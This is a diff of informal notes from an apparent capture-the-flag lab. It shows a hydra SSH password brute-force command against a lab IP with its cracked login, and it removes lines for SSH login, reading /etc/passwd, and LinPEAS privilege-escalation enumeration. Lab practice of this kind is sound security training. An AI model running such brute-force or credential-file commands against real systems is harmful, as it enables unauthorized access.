@@ -73,16 +73,6 @@ results:
    sudo hydra -l   jan   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  ssh://10.10.151.122
  
 
-   results:   [22][ssh] host: 10.10.151.122   login: jan  password: armando
-
-8. login usin ssh jan@10.10.91.97   with passward: armando
- cat /etc/passwd
-
-
-
-8. Enumerate the machine to find any vectors for privilege escalation.
-    
-	LinEnum: Scripted Local Linux Enumeration ...
-    https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
+   results:   [22][ssh] host: 10.10.151.122     login: jan      password: armando
    
-   https://youtu.be/xl2Xx5YOKcI?t=1275 
+   https://youtu.be/xl2Xx5YOKcI?t=1107
